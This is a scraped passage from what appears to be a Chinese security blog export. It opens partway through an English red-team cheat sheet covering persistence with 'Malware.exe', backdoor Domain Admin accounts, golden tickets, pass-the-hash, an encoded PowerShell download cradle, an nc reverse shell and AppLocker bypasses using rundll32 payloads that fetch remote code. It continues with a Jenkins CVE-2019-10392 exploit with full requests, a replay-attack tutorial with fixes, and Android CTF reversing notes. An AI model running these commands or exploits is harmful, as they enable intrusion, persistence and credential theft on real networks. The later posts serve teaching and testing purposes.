C:\\Temp\\SoftwareUpdate\\Malware.exe /sc daily /st 06:00 # Runs a task each time the user&#39;s session is idle for 5 minutes. schtasks /create /tn &quot;SoftwareUpdate&quot; /tr C:\\Temp\\SoftwareUpdate\\Malware.exe /sc onidle /i 5 # Runs a a task as SYSTEM when User Logs in. schtasks /create /ru &quot;NT AUTHORITY\\SYSTEM&quot; /rp &quot;&quot; /tn &quot;SoftwareUpdate&quot; /tr C:\\Temp\\SoftwareUpdate\\Malware.exe /sc onlogon Windows Startup FolderThis has been around for years as basically every version of Windows contains a startup folder. Windows 10 - C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp Current User Startup - C:\\Users\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup EXE/DLL HijackingLook for any missing DLL&#39;s or EXE&#39;s that common programs are calling on startup and over write them with your payload/malware. Also if you are localadmin/system you could provide over write a normal service binary or DLL, providing you don&#39;t break the execution. Add User Accountnet user m0chan /add /domain net group &quot;Domain Admins&quot; m0chan /add /domain net localgroup &quot;Administrators&quot; /add net user m0chan /domain /comment:&quot;Your Blueteam Fucking Sucks&quot; Persistence with KerberosWe can dump Kerberos tickets and inject them in session when deemed relevant however tickets have a low life span unless explically requested for 7 days. They can be injected into session with mimikatz or Rebeus. But let&#39;s say we have pwned a DC and got the KRBTGT Hash we can generate a golden ticket with a 10 year life span. kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:utilisateur.chocolate.kirbi SID is the domain SID Inject Ticket kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi Can also inject kirbi with Rebeus Lateral MovementPlinkplink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS #Windows 1803 Built in SSH Client (By Default) ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS Powershell Port Forwardnetsh interface portproxy add v4tov4 listenport=fromport listenaddress=fromip connectport=toport connectaddress=toip Permanent ^^ Requires iphlpsvc service to be enabled fromport: the port number to listen on, e.g. 80 fromip: the ip address to listen on, e.g. 192.168.1.1 toport: the port number to forward to toip: the ip address to forward to Invoke-SocksProxy#https://github.com/p3nt4/Invoke-SocksProxy/ Local Socks4 Proxy on 1080 Import-Module .\\Invoke-SocksProxy.psm1 Invoke-SocksProxy -bindPort 1080 Reverse Socks Proxy on Remote Machine Port 1080 # On the remote host: # Generate a private key and self signed cert openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout private.key -out cert.pem # Get the certificate fingerprint to verify it: openssl x509 -in cert.pem -noout -sha1 -fingerprint | cut -d &quot;=&quot; -f 2 | tr -d &quot;:&quot; # Start the handler python ReverseSocksProxyHandler.py 443 1080 ./cert.pem ./private.key # On the local host: Import-Module .\\Invoke-SocksProxy.psm1 Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 # Go through the system proxy: Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy # Validate certificate Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy -certFingerprint &#39;93061FDB30D69A435ACF96430744C5CC5473D44E&#39; Socat for Windows#https://github.com/StudioEtrange/socat-windows Generate SSL Cert for Encryption openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.key Server : socat OPENSSL-LISTEN:443,cert=/cert.pem - Client : socat - OPENSSL:localhost:443 #Port Forward socat OPENSSL-LISTEN:443,cert=/cert.pem,fork TCP:202.54.1.5:443 All SSL Connections will be redirected to 202.54.1.5:443 #Non SSL Port Forward socat TCP-LISTEN:80,fork TCP:202.54.1.5:80 SharpExec#https://github.com/anthemtotheego/SharpExec C# Implementation of Conventional Lateral Movement Techniques, such as -WMIExec - Semi-Interactive shell that runs as the user. Best described as a less mature version of Impacket&#39;s wmiexec.py tool. -SMBExec - Semi-Interactive shell that runs as NT Authority\\System. Best described as a less mature version of Impacket&#39;s smbexec.py tool. -PSExec (like functionality) - Gives the operator the ability to execute remote commands as NT Authority\\System or upload a file and execute it with or without arguments as NT Authority\\System. -WMI - Gives the operator the ability to execute remote commands as the user or upload a file and execute it with or without arguments as the user. Secure Sockets Funneling#https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html#ssf #git clone https://github.com/securesocketfunneling/ssf.git Massive shout out to 0xdf for explaining this perfectly in his article. Couldnt have done it better myself. Chisel (Fast TCP Tunnel over HTTP secured by SSH)#https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html CrackMapExec#https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-lateral-movement/ WMIC Spawn Processwmic /node:WS02 /user:DOMAIN\\m0chan /password:m0chan process call create &quot;powershell.exe -Enc aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ARwBvAG8AZABuAGkAZwBoAHQALgBwAHMAMQAiACkAKQA7ACAAaQBmACgAWwBCAHkAcABhAHMAcwAuAEEATQBTAEkAXQA6ADoARABpAHMAYQBiAGwAZQAoACkAIAAtAGUAcQAgACIAMAAiACkAIAB7ACAAaQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ASABSAEUAdgBlAG4AdABzAC4AcABzADEAIgApACkAIAB9AA==&quot; WinRS#https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs winrs [/&lt;parameter&gt;[:&lt;value&gt;]] &lt;command&gt; winrs /r:https://contoso.com command winrs /r:http://[1080:0:0:0:8:800:200C:417A]:80 command winrs /r:myserver /ad /u:administrator /p:$%fgh7 dir \\\\anotherserver\\share Invoke-WMIExec.ps1Invoke-WMIExec -Target 10.10.14.14 -Username rweston_da -Hash 3ff61fa259deee15e4042159d 7b832fa -Command &quot;net user user pass /add /domain&quot; PS C:\\users\\user\\Downloads&gt; Invoke-WMIExec -Target 10.10.120.1 -Username m0chan -Hash 3ff61fa259deee15e4042159d 7b832fa -Command &quot;net group &quot;&quot;Domain Admins&quot;&quot; m0chan /add /domain&quot; Powershell Invoke-Command (Requires Port 5985)$secpasswd = ConvertTo-SecureString &#39;pass&#39; -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential(&#39;m0chan\\user&#39;, $secpasswd) Invoke-Command -ComputerName FS01 -Credential $cred -ScriptBlock {whoami} PSExecpsexec.exe \\\\dc01.m0chanAD.local cmd.exe Powershell Remoting$secpasswd = ConvertTo-SecureString &#39;password&#39; -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential(&#39;WS02\\USER&#39;, $secpasswd) $Session = New-PSSession -ComputerName FileServer -Credential $cred Enter-PSSession $Session Configure Remote Service over SMB (Requires Local Admin on Target Machine)net use \\\\192.168.0.15 [password] /u:DOMAIN\\m0chan sc \\\\192.168.0.15 create &lt;service_name&gt; binpath= &quot;cmd.exe /k COMMAND&quot; sc \\\\192.168.0.15 create &lt;service_name&gt; binpath= &quot;cmd.exe /k &lt;c:\\tools\\nc.exe -L -p &lt;port&gt; -e cmd.exe&gt;&quot; sc \\\\192.168.0.15 start &lt;service_name&gt; Pass-The-Hashcrackmapexec &lt;ip&gt; -u &lt;user&gt; -H &quot;&lt;lm&gt;&quot; -x &quot;&lt;msfvenom psh-cmd&gt;&quot; impacket-wmiexec &lt;user&gt;@&lt;ip&gt; -hashes &lt;lm:nt&gt; pth-winexe -U &lt;user&gt;%&lt;ntlm&gt; //&lt;ip&gt; &quot;&lt;msfvenom psh-cmd&gt;&quot; python wmiexec.py -hashes :&lt;hash&gt; &lt;user&gt;@&lt;ip&gt; xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /pth:&lt;ntlm&gt; /v:&lt;ip&gt;:3389 /dynamic-resolution sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a Pass-The-Ticket#Check my Blog Post Kerberos Attacks in Depth for Further Information Rebeus monitor /interval:30 Monitoring logon sessions every 30 seconds so I can pinch Kerb tickets Reubus will now give you a Kerberos ticket in base64 which you can pass with Rubeus.exe ptt /ticket:[base64blobhere] We can now request TGS service tickets to access network resources as this user Obfuscation / Evasion TechniquesInvoke-Obfusaction#https://github.com/danielbohannon/Invoke-Obfuscation Can obfusacte Scripts &amp; Commands Obfusacte script from remote url SET SCRIPTPATH https://thisdosentexist.m0chan.com/Invoke-Mimikatz.ps1 Can also set Sscript block base64 PS SET SCRIPTBLOCK powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAWQBvAHUAIABjAGEAbgAgAHUAcwBlACAAYgBhAHMAaQBjACAALQBlAG4A== Invoke-CradleCraft#https://github.com/danielbohannon/Invoke-CradleCrafter Similar to Invoke-Obfusaction but allows you to obfusacte cradles for downloading i/e IEX (New-Object Net.WebClient).DownloadString(&#39;http://c2server.com/Invoke-Mimikatz.ps1&#39;) Invoke-DOSfuscation#https://github.com/danielbohannon/Invoke-DOSfuscation Unicornhttps://github.com/trustedsec/unicorn unicorn.py Nishang.ps1 AppLocker / Constrained Mode BypassesVerify is you are in constrained mode$ExecutionContext.SessionState.LanguageMode PowershellVeryLess Bypassgit clone https://github.com/decoder-it/powershellveryless.git C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /reference: C:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf3856ad364e35\\system.management.automation.dll /out:C:\\Users\\m0chan\\Scripts\\powershellveryless.exe C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /reference:C:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf3856ad364e35\\system.management.automation.dll /out:c:\\setup\\powershellveryless.exe c:\\scripts\\powershellveryless.cs Execute -&gt; powershellveryless.exe script.ps1 script.ps1 = Script of your Choice World Writable Folders (By Default on Windows 10 1803)#https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md C:\\Windows\\Tasks C:\\Windows\\Temp C:\\windows\\tracing C:\\Windows\\Registration\\CRMLog C:\\Windows\\System32\\FxsTmp C:\\Windows\\System32\\com\\dmp C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys C:\\Windows\\System32\\spool\\PRINTERS C:\\Windows\\System32\\spool\\SERVERS C:\\Windows\\System32\\spool\\drivers\\color C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SyncCenter C:\\Windows\\SysWOW64\\FxsTmp C:\\Windows\\SysWOW64\\com\\dmp C:\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\SyncCenter C:\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\PLA\\System Downgrade AttackDowngrading to PS Version 2 circumvates Constrained Mode powershell.exe -version 2 Verifiy versions with $PSVersionTable Get-Host AppLocker COR Profile Bypassset COR_ENABLE_PROFILING=1 COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db} set COR_PROFILER_PATH=C:\\Users\\m0chan\\pwn\\reverseshell.dll tzsync powershell Where .DLL is your payload i/e reverse shell, beacon etc. MSBuild Powershell/CMD BypassYou can use this if cmd is not disabled but powershell is https://github.com/Cn33liz/MSBuildShell/blob/master/MSBuildShell.csproj C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe pshell.csproj Also https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c MSBuild PSAttack :D :D PSAttack#https://github.com/jaredhaight/PSAttack Use if Powershell.exe is not available. this does not rely on powershell.exe, but Instead directly calls powershell through .NET Framework circumvating most application whitelisting etc. Has numerous modules prebuilt in and is built in C Sharp / .NET so can be reflectively loaded :) NoPowerShell#https://github.com/bitsadmin/nopowershell Primiarily to be used with Cobalt &amp; Execute Assembly but can also be reflectively loaded from any other C2 infra. runDLL32 Bypass#Reference: https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/ rundll32.exe is a .exe found on all Windows based systems located at C:\\Windows\\system32\\rundll32.exe rundll32 shell32.dll,Control_RunDLL payload.dll rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &lt;HTML Code&gt; rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&#39;http://ip:port/&#39;);&quot; rundll32.exe javascript:&quot;\\..\\mshtml.dll,RunHTMLApplication &quot;;eval(&quot;w=new%20ActiveXObject(\\&quot;WScript.Shell\\&quot;);w.run(\\&quot;calc\\&quot;);window.close()&quot;); rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);} rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test&quot;)","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"CVE-2019-10392 Jenkins 2k19认证远程RCE","slug":"CVE-2019-10392-Jenkins-2k19认证远程RCE","date":"2019-09-16T00:53:35.000Z","updated":"2019-09-16T00:55:29.584Z","comments":true,"path":"2019/09/CVE-2019-10392-Jenkins-2k19认证远程RCE/","link":"","permalink":"/2019/09/CVE-2019-10392-Jenkins-2k19认证远程RCE/","excerpt":"","text":"CVE-2019-10392 Jenkins 2k19认证远程RCE使用以下命令在本地使用Docker启动了Jenkins实例： docker run -p 8080:8080 -p 50000:50000 jenkins/jenkins:lts-alpine 版本为：Jenkins 2.176.3 git客户端：http://updates.jenkins-ci.org/download/plugins/git-client/2.8.2/git-client.hpi git插件：http://updates.jenkins-ci.org/download/plugins/git/3.12.0/git.hpi 由于官方已经升级了client为2.8.5，git升级到3.12.1。所以需要手动上传插件，上传完成后如下。 新建用户user 为账号配置权限，作者这里没看到给了create权限，如果需要使用普通账号来创建任务测试，则需要给create权限，或者已有任务的情况下来操作已有任务也是可以的，就不用给create权限，此处用create来测试。 登陆user用户，可以看到用户界面如此 如下选择 在SCM中选择git执行 查看git-ls-remote文档，从给的参数中可以注意到–upload-pack=。看起来像是执行了某些命令，而漏洞作者也是看到了这个参数的形式而采用了这个参数执行。 https://git-scm.com/docs/git-ls-remote.html 参数的意义是：在远程主机上指定git-upload-pack的完整路径。这允许列出通过SSH访问的存储库中的引用，以及SSH守护程序不使用用户配置的PATH的位置。 如此，执行--upload-pack=&quot;`id`&quot; 可以看到命令已经执行。 至于请求测试的话，和原作者得到写法有点出入，暂不知为何，但可以使用如下方式，请求如下，其中test2为任务名，获取Jenkins-Crumb GET /job/test2/configure HTTP/1.1 Host: 192.168.253.139:8080 Upgrade-Insecure-Requests: 1 DNT: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Referer: http://192.168.253.139:8080/job/test2/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cookie: screenResolution=1536x864; JSESSIONID.b4706a48=node013tshj9ds2r3kr18mgmyaquc114.node0; JSESSIONID.83272e09=node0dt5602fpgb3a108885vr3228h9.node0 Connection: close 然后把获得的”Jenkins-Crumb”，携带到请求中 POST /job/test2/descriptorByName/hudson.plugins.git.UserRemoteConfig/checkUrl HTTP/1.1 Host: 192.168.253.139:8080 Content-Length: 51 Origin: http://192.168.253.139:8080 Jenkins-Crumb: b2ecec81285edce6716900a2d4e1b687 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36 Content-type: application/x-www-form-urlencoded; charset=UTF-8 Accept: text/javascript, text/html, application/xml, text/xml, */* X-Prototype-Version: 1.7 X-Requested-With: XMLHttpRequest DNT: 1 Referer: http://192.168.253.139:8080/job/test2/configure Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cookie: screenResolution=1536x864; JSESSIONID.b4706a48=node013tshj9ds2r3kr18mgmyaquc114.node0; JSESSIONID.83272e09=node0dt5602fpgb3a108885vr3228h9.node0 Connection: close value=--upload-pack%3D%22%60id%60%22&amp;credentialsId= 原文：https://iwantmore.pizza/posts/cve-2019-10392.html","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"Android Java Hook","slug":"Android-Java-Hook","date":"2019-09-16T00:52:55.000Z","updated":"2019-09-16T00:55:47.295Z","comments":true,"path":"2019/09/Android-Java-Hook/","link":"","permalink":"/2019/09/Android-Java-Hook/","excerpt":"","text":"使用Inspeckage尝试hook其中的加密函数环境：夜神模拟器Inspeckage 2.3某收件APP 获取关键参数安装app后，抓包看到如下参数 在AK中搜索其中关键词fm和sign，搜索中发现sign过多，于是尝试搜索FM，搜索中发现如下class文件。 打开Java源代码，在其中的一个void类型的b函数中发现关键。 打开对应文件的sha256函数 基本可以确定加密算法为这个，对其中的三个参数加盐来sha256 paramString1对应了localObject5，也就是timestamp paramString2对应了localObject4，也就是nonce paramString3对应了localObject2，也是其中暂不得知道为何的参数 这几个参数，其中sign是不得知为什么参数，其他一个为uuid，一个为时间戳，于是我们尝试hook这个函数。 配置HOOK在Inspeckage的界面中选着HOOK，点击找到左侧加载出来的函数方法 点击后如下，添加 在模拟器中做一个请求，此处仍然使用之前的登陆请求，hook到的参数和结果 其中result就是抓包到的请求sign参数，可以看到参数paramString3为一串拼接的字符串，其中密码为MD5加密，在hash选项中可以看到加密的原参数，和sha256用到的salt值 加密尝试那么尝试使用在线加密，从hook到的结果得知，paramString3就是请求中的FM字段 和请求中携带的sign参数对比为相同参数 本以为会到此为止，但是当仔细查看hook的参数时发现，paramString3中的参数均是缺少标签对的，例如 &lt;root&gt;123&lt;/root&gt;&lt;sign&gt;123&lt;/sign&gt; 他只显示 123&lt;/root&gt;123&lt;/sign&gt; 暂没查到原因。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"重放攻击","slug":"重放攻击","date":"2019-08-28T07:19:36.000Z","updated":"2019-08-28T07:25:16.604Z","comments":true,"path":"2019/08/重放攻击/","link":"","permalink":"/2019/08/重放攻击/","excerpt":"","text":"重放攻击1. 漏洞简介​ 首先简单看一下百度百科对重放攻击的简介：重放攻击(Replay Attacks)又称重播攻击、回放攻击，是指攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程，破坏认证的正确性。重放攻击可以由发起者，也可以由拦截并重发该数据的敌方进行。攻击者利用网络监听或者其他方式盗取认证凭据，之后再把它重新发给认证服务器。 2. 漏洞原理​ 重放攻击的基本原理就是把以前窃听到的数据原封不动地重新发送给接收方。很多时候，网络上传输的数据是加密过的，此时窃听者无法得到数据的准确意义。但如果他知道这些数据的作用，就可以在不知道数据内容的情况下通过再次发送这些数据达到愚弄接收端的目的。 3. 漏洞危害​ 重放攻击本身只是一种行为和方式，并不会直接造成系统的危害，可能在某些系统中，过多和高频次的重复会对系统造成压力。重放攻击的重要点在于重放的是可以造成目的效果的数据包，从而达到修改和多次执行的效果。 重放攻击主要是针对系统没有效验请求的有效性和时效性，对于多次请求执行，系统将多次响应。在重放攻击利用最多的形式中，短信轰炸算是重放攻击最直接的利用表现。 4. 常见漏洞类型1. 短信轰炸​ 短线轰炸算是重放攻击中最为直接的利用形式，当系统端没有效验请求的时间差或者只在前端做请求限制的时候，可以无限的请求短信来达到短信轰炸的目的。例如，如下APP请求注册时可以使用手机号和验证码注册登录，但是没有限制短信请求次数和时间间隔。 多次请求后可以在手机上看到请求到的短信 2. 暴力破解​ 暴力破解是重放攻击中，典型的非只重放而达到的攻击类型，而是利用重放这个动作来达到暴力破解的目的。当系统端未做请求验证和错误次数限制时，就可以根据字典或者设定的字符串来破解特定的参数。 a. 暴力破解密码​ 当用户登陆时，缺少验证码或者验证码不失效，并且账号没有错误的次数限制。可以通过暴力破解碰撞密码来登录。例如此处，暴力破解原密码来登陆绑定账号。 此处验证码只判断是否存在，并不失效，且可以多次尝试绑定账号，例如如下，当返回为1的时候就是密码正确，绑定成功。 b. 暴力破解验证码​ 当我们申请修改账号密码等操作时，往往需要给手机号或者邮箱发送一个验证码，当需要修改他们或者越权操作的时候并不一定可以通过修改接收手机或邮箱来收到验证码，这时候可以尝试暴力破解验证码。例如： 对此请求多次重放后发现仍然返回修改密码失败，说明验证码可以多次使用，这种情况下很有可能是验证码在没有正确验证使用时，后台并不会失效。那么我们尝试爆破验证码，如果成功将修改账号密码。 c. 暴力破解参数​ 此情况大都在尝试越权的时候，还有尝试修改某些不可知但是可预测的参数，例如此篇文章： 重置凭证可暴破 d. 暴力破解hash密码​ 此种暴力破解类似破解密码，但此种一般不需要考虑某些验证条件，常在获取到主机权限后，利用hash抓取工具获得，例如Windows平台的hash抓取工具：mimikaze， pwdump7等。获取到Windows的NTLM。 Administrator:500:aad3b435b51404eeaad3b435b51404ee:44f077e27f6fef69e7bd834c7242b040::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 常见的爆破工具：Ophrack、John the Ripper、hashcat 这种方式都需要提前准备彩虹表，当然kail上也有集成，同时也有默认字典。 3. 重放支付​ 这种情况往往出现在支付订单的时候，支付到最后一个请求包时，系统收到请求就会确定已支付下单。这时候在系统没有做出准确效验的时候就会根据是否支付成功的验证字段来确定下单，多次重放的时候，系统会根据暂无失效且正常的请求下单。来达到使用同一请求多次获取成功的订单。 ​ 但这种情况，现在已经很少会遇到，上一次遇到还要追溯到去年初了。 4. 重放修改密码​ 在很多时候，我们修改密码等操作的时候，是分几步完成的，例如先验证手机验证码，跳转在修改密码。如果在最后确认修改的时候抓包多次重放，可以达到免验证来达到修改密码的作用。也就是这里并没有强制效验手机号和验证码。也就存在了任意修改密码的可能，当然要是效验了手机号和验证码的对应关系，也许就不可以了。 POST /userpwd?p=1 HTTP/1.1 Host: xxx.com phone=13111111111&amp;code=123456 当我们如上的去请求验证码效验的时候，如果通过会跳往第二个页面修改密码 POST /userpwd?p=2 HTTP/1.1 Host: xxx.com phone=13111111111&amp;pwd=123456&amp;newpwd=123456 当只是简单的重置的时候，先不谈越权问题，这个包都可能造成多次修改多次重置密码。而并不用验证。 POST /userpwd?p=2 HTTP/1.1 Host: xxx.com phone=13111111111&amp;code=123456&amp;pwd=123456&amp;newpwd=123456 在修改密码的时候遇到也携带了其他的参数，例如之前的短信验证字段，那么就不一定会造成越权，但可能会有多次重放修改密码的可能。这时候如果需要修改他人密码，就需要爆破验证码来达到效果。这就回到了暴力破解中的验证码爆破。 POST /userpwd HTTP/1.1 Host: xxx.com email=qq@qq.com&amp;code=123456 有些系统在重置密码的时候并不是需要各种验证，而是你申请修改就会给你发送重置的密码到你的注册邮箱。例如如上数据包，当验证存在邮箱的时候，只需要输入图片验证码就会发送已经被重置的新密码到指定邮箱。这时候虽然我们不能获取密码，但是缺少验证的方式可导致其他账号密码被重复修改，而影响他人的登陆。真可谓损人不利己的好用处。233333 5. 条件竞争条件竞争是后台对共享数据读写的时候，多线程没有对共享数据执行线程锁，导致在多个线程获取到的值并不是当前线程操作的实时值，典型的例子是，一份钱买多份。 例如去年护网杯的Itshop，此处给出WP以便参考：https://www.codercto.com/a/31463.html 5. 漏洞靶场漏洞环境：Django2.2、python3 此处利用的是之前写的一个bug平台，当验证会提示如下时，可以根据提示的不同来判断密码是否正确，当密码正确的时候就会跳转到内部页面。 def login(request): if request.method == &#39;POST&#39;: login_form = forms.UserForm(request.POST) message = &#39;请检查填写的内容！&#39; if login_form.is_valid(): username = login_form.cleaned_data.get(&#39;username&#39;) password = login_form.cleaned_data.get(&#39;password&#39;) try: user = models.User.objects.get(name=username) except : message = &#39;用户不存在！&#39; return render(request, &#39;login/login.html&#39;, locals()) if user.password == password: request.session[&#39;is_login&#39;] = True request.session[&#39;user_id&#39;] = user.id request.session[&#39;user_name&#39;] = user.name return redirect(&#39;/index/&#39;) else: message = &#39;密码不正确！&#39; return render(request, &#39;login/login.html&#39;, locals()) else: return render(request, &#39;login/login.html&#39;, locals()) login_form = forms.UserForm() return render(request, &#39;login/login.html&#39;, locals()) 抓包登陆，在没有验证码，且csrf_token在没有起到唯一性的时候，可以通过爆破密码登陆。 把数据包丢到Intruder中，多次爆破后发现当密码正确的时候会产生302的跳转。 漏洞修复：添加验证码，虽然此处可以添加框架自带的验证码，但建议使用请求式验证码。如不能使用验证码也可以给账号登陆错误次数做一次限制。 6. 漏洞测试工具重复攻击一般采用可以抓包的工具都可以重复，例如：Charles、burp等。此处较为常用burp。因为在payload上，处理较为灵活，当然如果需要的只是重放，Charles应该不会让你失望。 burp: https://portswigger.net/burp Charles：https://www.charlesproxy.com/ 7. 漏洞修改 添加图片验证码，为了应对偏爆破类的重放攻击，添加验证字段是最简单有效的手段。当然你要保证验证是在一次使用后及时失效。 限制请求次数，有些地方并不适用于添加验证码，或者不能添加验证码。这时候针对同一账户的错误次数限制就显得很有必要。例如，当错误次数连续达到五次的时候，暂时十分钟内不能登陆。 效验验证码和用户身份，某些重放攻击是利用了手机号和验证码之间的不对应性，特别是在修改密码等处，这时候需要把验证码和请求的用户手机号做联系，当重放或者越权的时候根据验证码次数和对应关系来判断是否允许修改。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"2018 SWPUCTF","slug":"2018-SWPUCTF","date":"2019-08-26T09:54:14.000Z","updated":"2019-08-26T09:55:50.708Z","comments":true,"path":"2019/08/2018-SWPUCTF/","link":"","permalink":"/2019/08/2018-SWPUCTF/","excerpt":"","text":"某日在GitHub中看到了一些CTF使用的安卓逆向分析题，其中一个是SWPUCTF，是个没怎么听过的CTF。虽然我不怎么了解CTF。23333 于是，抽时间分析看看是否可以做出来。两个APK。 app-debug1.apk把apk丢到AK中，反编译，结果中有一个目录是assert/timg_2.zip。讲道理，第一反应看到这个，肯定是多多少少有点关系的，本以为是做了代码抽取，动态加载。 但是这并不是一个zip包，使用010editor查看，发现真不是一个zip包，而是一个完整的jpg格式文件。 而在文件nextcontent.class中也发现了这个所谓的zip包被当作jpg来读取。 直接修改为jpg格式图片，打开。 嗯。。。。这就。。。肯定是姿势不对，换一种方式。 既然此处是纯JAVA层文件，是对输入的密码的效验，那么采用调试的方式来做。 此处采用jeb调试，其中，对密码效验的关键方法为check。 方法开始先判断长度是否为12位，然后判断是否长度为0。 先修改check下： 00000000 const/16 v5, 12 00000004 const/4 v2, 0 00000006 invoke-virtual String-&gt;toCharArray()[C, p1 0000000C move-result-object v1 0000000E array-length v3, v1 00000010 if-eq v3, v5, :16 #if-ne 或者添加const/16 v3, 0xc 在修改mainactivity类中onclick方法下的 0000001E new-instance v0, Check 00000022 invoke-direct Check-&gt;&lt;init&gt;()V, v0 00000028 invoke-virtual Check-&gt;checkPassword(String)Z, v0, v2 0000002E move-result v3 00000030 if-eqz v3, :72 #修改为if-nez 重编译安装，输入任意值跳到第二部分，此时显示图片，但是图片上并没有相应的字符串。 继续调试第二部分。调试的时候发现jeb仍然是不好用，于是改用Androidstudio。在mainactivity2$1.smail文件中找到了读取第二个输入并且做对比的地方。 .method public onClick(Landroid/view/View;)V .locals 3 .param p1, &quot;v&quot; # Landroid/view/View; .prologue .line 29 iget-object v2, p0, Lcom/example/test/ctf02/MainActivity2$1;-&gt;this$0:Lcom/example/test/ctf02/MainActivity2; iget-object v2, v2, Lcom/example/test/ctf02/MainActivity2;-&gt;editText:Landroid/widget/EditText; invoke-virtual {v2}, Landroid/widget/EditText;-&gt;getText()Landroid/text/Editable; move-result-object v2 const-string v2, &quot;android.is.very.fun&quot; #增加 invoke-virtual {v2}, Ljava/lang/Object;-&gt;toString()Ljava/lang/String; move-result-object v1 .line 30 .local v1, &quot;str&quot;:Ljava/lang/String; new-instance v0, Landroid/content/Intent; invoke-direct {v0, v1}, Landroid/content/Intent;-&gt;&lt;init&gt;(Ljava/lang/String;)V .line 31 .local v0, &quot;intent&quot;:Landroid/content/Intent; iget-object v2, p0, Lcom/example/test/ctf02/MainActivity2$1;-&gt;this$0:Lcom/example/test/ctf02/MainActivity2; invoke-virtual {v2, v0}, Lcom/example/test/ctf02/MainActivity2;-&gt;sendBroadcast(Landroid/content/Intent;)V .line 32 return-void .end method 获取了Broadcast组件，在mainfast.xml文件中有关于这个组件的定义，于是在上把v2修改为组件名字符串。 重编译安装，第一个输入只需要随便输入几个不重复的字母，跳到第二个输入，只需要点击确认，就会弹出写有flag的图片。 app-debug2.apk同样，丢到AK中反编译，反编译内容如下，其中包含JNI.smail文件，所以大概率是分析so文件。 